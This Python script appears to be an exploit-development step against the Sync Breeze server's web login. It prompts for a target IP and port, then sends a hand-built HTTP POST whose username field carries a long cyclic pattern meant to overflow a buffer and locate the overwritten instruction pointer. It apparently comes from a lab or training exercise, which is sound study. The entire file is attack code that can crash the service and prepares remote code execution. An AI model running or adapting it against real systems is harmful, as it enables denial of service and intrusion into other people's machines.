#!/usr/bin/python3

#!/usr/bin/python3


import sys,socket
import time

print("*****Sync-Breeze*****")
ip_address=input("Enter the IP address\n")
port=input("Enter the port number\n")

if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*50)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*50)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*50)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*50)
        print("Issues with the user input")


elif (len(ip_address)>0) and (len(port)>0):
    print("*"*50)
    size=b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))

    buff=b"username=" + size + b"&password=A"


    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.215\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8') + b"\r\n"
    buffer+=b"Origin: http://192.168.100.215\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.215/login\r\n"
    buffer+=b"\r\n"

    buffer=buffer+buff
    s.send((buffer))
